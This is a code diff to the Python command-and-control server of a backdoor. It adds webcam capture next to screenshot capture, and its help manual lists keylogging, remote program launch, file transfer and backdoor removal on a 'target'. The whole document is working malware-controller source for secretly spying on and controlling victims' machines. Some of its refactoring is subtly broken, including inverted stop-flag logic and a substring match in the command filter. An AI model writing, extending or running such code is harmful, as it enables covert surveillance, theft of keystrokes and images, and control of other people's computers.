@@ -1,7 +1,7 @@
 # Standard library imports
 import json
+import hashlib
 import os
-import select
 import socket
 import ssl
 import sys
@@ -11,18 +11,35 @@ import threading
 # Local application/library specific imports
 from colour import banner, Colour
 
-# Variables
-heartbeat_timeout = 60
-heartbeat_wait = 1
+# Global Variables
+global start_flag
+
+# Constants
+SCREENSHOT_DIR = 'images/screenshots'
+SCREENSHOT_CHUNK_SIZE = 10485760  # 10MB
+SCREENSHOT_TIMEOUT = 3
+
+WEBCAM_DIR = './images/webcam'
+WEBCAM_CHUNK_SIZE = 10485760  # 10MB
+WEBCAM_TIMEOUT = 10
+
 
 def reliable_recv(target):
     data = ''
     while True:
         try:
-            data = data + target.recv(1024).decode().rstrip()
+            data += target.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
+            # If received data is not a complete JSON, continue receiving.
             continue
+        except socket.error as e:
+            print(f"Socket error: {e}")
+            return None
+        except Exception as e:
+            # Handle any other exceptions that may occur.
+            print(f"Unexpected error: {e}")
+            return None
 
 
 def reliable_send(target, data):
@@ -42,51 +59,177 @@ def reliable_send(target, data):
 # This function is to stop server.py issuing reliable_send if command='help' or 'clear'
 # Creates less network traffic.
 def exclusion_words(command):
-    exclusion_words = ['help', 'clear']  # make this global variable
-    if command == exclusion_words:
-        return 1
+    exclusion_words = ['help', 'clear']  # consider making this a global constant
+    return any(word in command for word in exclusion_words)
 
 
 def upload_file(target, file_name):
-    f = open(file_name, 'rb')
-    target.send(f.read())
+    try:
+        f = open(file_name, 'rb')
+        data = f.read()
+        f.close()
+    except FileNotFoundError:
+        print(f"The file {file_name} does not exist.")
+        return
+    except IOError as e:
+        print(f"Error reading from {file_name}: {e}")
+        return
+
+    try:
+        target.send(data)
+    except socket.error as e:
+        print(f"Error sending data: {e}")
+        return
+
+    print(f"File {file_name} uploaded successfully.")
 
 
 def download_file(target, file_name):
-    f = open(file_name, 'wb')
+    try:
+        f = open(file_name, 'wb')
+    except IOError as e:
+        print(f"Error opening file {file_name} for writing: {e}")
+        return
+
     target.settimeout(2)
-    chunk = target.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
+    chunk = None
+    
+    try:
+        while True:
+            try:
+                if chunk is not None:
+                    f.write(chunk)
+                chunk = target.recv(1024)
+            except socket.timeout:
+                break  # Exit the loop if a timeout occurs
+    except socket.error as e:
+        print(f"Error receiving data: {e}")
+    finally:
+        f.close()
+
     target.settimeout(None)
-    f.close()
+
+    print(f"File {file_name} downloaded successfully.")
+
+
+def validate_checksum(checksum1, checksum2):
+    if checksum1 == checksum2:
+        return True
+    else:
+        return False
+
+
+def calculate_sha256_checksum(file_name):
+    """
+    Calculate the SHA-256 checksum of a file.
+    Args:
+        file_name (str): The name of the file to check.
+    Returns:
+        str: The SHA-256 checksum of the file.
+    """
+    sha256_hash = hashlib.sha256()
+    with open(file_name,"rb") as f:
+        for byte_block in iter(lambda: f.read(4096),b""):
+            sha256_hash.update(byte_block)
+    return sha256_hash.hexdigest()
+
+
+def calculate_md5_checksum(file_name):
+    """
+    Calculate the MD5 checksum of a file.
+    Args:
+        file_name (str): The name of the file to check.
+    Returns:
+        str: The MD5 checksum of the file.
+    """
+    md5_hash = hashlib.md5()
+    with open(file_name,"rb") as f:
+        for byte_block in iter(lambda: f.read(4096),b""):
+            md5_hash.update(byte_block)
+    return md5_hash.hexdigest()
+
+
+# TODO: Write a function for checksum validation on client-side.
 
 
 def screenshot(target, count):
-    directory = './screenshots'
-    if not os.path.exists(directory):
-        os.makedirs(directory)
-    f = open(directory + '/screenshot_%d.png' % (count), 'wb')  # if target=Linux then #apt-get install scrot
-    target.settimeout(3)
+    """
+    Take a screenshot and save it to a file.
+    Args:
+        target (socket): The target socket to instruct.
+        count (int): The current screenshot count.
+    """
+    # Ensure the screenshots directory exists.
+    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+
+    file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
     try:
-        chunk = target.recv(10485760)  # 10MB
-    except:
-        pass
+        f = open(file_name, 'wb')
+    except IOError as e:
+        print(f"Error opening file {file_name} for writing: {e}")
+        return count
 
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = target.recv(10485760)
-        except socket.timeout as e:
-            break
+    # Receive the screenshot data.
+    target.settimeout(SCREENSHOT_TIMEOUT)
+    chunk = None
+    try:
+        while True:
+            try:
+                if chunk is not None:
+                    f.write(chunk)
+                chunk = target.recv(SCREENSHOT_CHUNK_SIZE)
+            except socket.timeout:
+                break  # Exit the loop if a timeout occurs
+    except socket.error as e:
+        print(f"Error receiving data: {e}")
+    finally:
+        f.close()
+
     target.settimeout(None)
-    f.close()
-    count += 1
+    print(f"Screenshot saved to {file_name}")
 
+    count += 1
+    return count
+
+
+def webcam(target, count):
+    """
+    Capture a webcam image and save it to a file.
+    Args:
+        target (socket): The target socket to instruct.
+        count (int): The current image count.
+    """
+    # Ensure the webcam images directory exists.
+    os.makedirs(WEBCAM_DIR, exist_ok=True)
+
+    # Open the file for writing.
+    file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
+    try:
+        f = open(file_name, 'wb')
+    except IOError as e:
+        print(f"Error opening file {file_name} for writing: {e}")
+        return count
+
+    # Receive the image data.
+    target.settimeout(WEBCAM_TIMEOUT)
+    chunk = None
+    try:
+        while True:
+            try:
+                if chunk is not None:
+                    f.write(chunk)
+                chunk = target.recv(WEBCAM_CHUNK_SIZE)
+            except socket.timeout:
+                break  # Exit the loop if a timeout occurs
+    except socket.error as e:
+        print(f"Error receiving data: {e}")
+    finally:
+        f.close()
+
+    target.settimeout(None)
+    print(f"Webcam image saved to {file_name}")
+
+    return count + 1
 
 # TODO: webcam(target) takes a quick webcam image
 # https://stackoverflow.com/a/69282582/4443012
@@ -110,6 +253,7 @@ def server_help_manual():
     keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
     keylog_stop                         --> Stop And Self Destruct Keylogger File
     screenshot                          --> Takes screenshot and sends to server ./screenshots/
+    webcam                              --> Takes image with webcam and sends to ./images/
     start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
     remove_backdoor                     --> Removes backdoor from target!!!
     
@@ -137,7 +281,9 @@ def c2_help_manual():
 
 
 def target_communication(target, ip):
-    count = 0
+    screenshot_count = 0
+    webcam_count = 0
+
     while True:
         command = input('* Shell~%s: ' % str(ip))
         reliable_send(target, command)
@@ -154,8 +300,11 @@ def target_communication(target, ip):
         elif command[:8] == 'download':
             download_file(target, command[9:])
         elif command[:10] == 'screenshot':
-            screenshot(target, count)
-            count = count + 1
+            screenshot(target, screenshot_count)
+            screenshot_count += 1
+        elif command[:6] == 'webcam':
+            webcam(target, webcam_count)
+            webcam_count += 1
         elif command == 'help':
             server_help_manual()
         else:
@@ -165,7 +314,7 @@ def target_communication(target, ip):
 
 def accept_connections():
     while True:
-        if stop_flag:
+        if start_flag == False:
             break
         sock.settimeout(1)
         try:
@@ -179,7 +328,7 @@ def accept_connections():
             pass
 
 
-def close_all_connections(targets):
+def close_all_target_connections(targets):
     for target in targets:
         reliable_send(target, 'quit')
         target.close()
@@ -303,7 +452,7 @@ def exit_all(targets, sock, t1):
         sock (socket): The socket to close.
         t1 (Thread): The thread to stop.
     """
-    stop_flag = True
+    start_flag = True
     for target in targets:
         reliable_send(target, 'quit')
         target.close()
@@ -386,18 +535,35 @@ def print_banner_and_initial_info():
     print('Run "help" command to see the usage manual')
     print(Colour().green('[+] Waiting For The Incoming Connections ...'))
 
-if __name__ == '__main__':
-    targets = []
-    ips = []
-    stop_flag = False
 
-    sock = initialise_socket()
+def join_thread(t1):
+    t1.join()
 
-    t1 = start_accepting_connections(sock)
 
-    print_banner_and_initial_info()
+def close_socket(sock):
+    sock.close()
+    global start_flag
+    start_flag = False
 
-    while True:
+
+def exit_c2_server(sock, t1):
+    close_socket(sock)
+    join_thread(t1)
+    print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
+
+
+def run_c2_server(targets, ips, sock, t1, start_flag):
+    """
+    Runs the Command & Control server.
+    Args:
+        targets (list): The list of target connections.
+        ips (list): The list of IP addresses of the targets.
+        sock (socket): The server socket.
+        t1 (threading.Thread): The thread that's accepting connections.
+        start_flag (bool): Flag indicating whether to start or stop the server.
+    """
+    
+    while start_flag:
         try:
             command = input('[**] Command & Control Center: ')
             if command == 'targets':
@@ -407,14 +573,8 @@ if __name__ == '__main__':
             elif command[:7] == 'session':
                 handle_session_command(targets, ips, command)
             elif command == 'exit':
-                for target in targets:
-                    reliable_send(target, 'quit')
-                    target.close()
-                sock.close()
-                stop_flag = True
-                t1.join()
-                print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
-                break
+                close_all_target_connections(targets)
+                start_flag = exit_c2_server(sock, t1)
             elif command[:4] == 'kill':
                 kill_target(targets, ips, command)
             elif command[:7] == 'sendall':
@@ -432,7 +592,17 @@ if __name__ == '__main__':
         except ValueError as e:
             handle_value_error(e)
 
+
+if __name__ == '__main__':
+    targets = []
+    ips = []
+    start_flag = True
+
+    sock = initialise_socket()
+    t1 = start_accepting_connections(sock)
+    print_banner_and_initial_info()
+
+    run_c2_server(targets, ips, sock, t1, start_flag)
+
 # TODO: encrypt connection
-# TODO: Implement a 'pulse' feature between server and backdoor (Keep alive)
-# This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket
-# and will attempt to run connection() function again.
+# TODO: Implement a 'heartbeat'
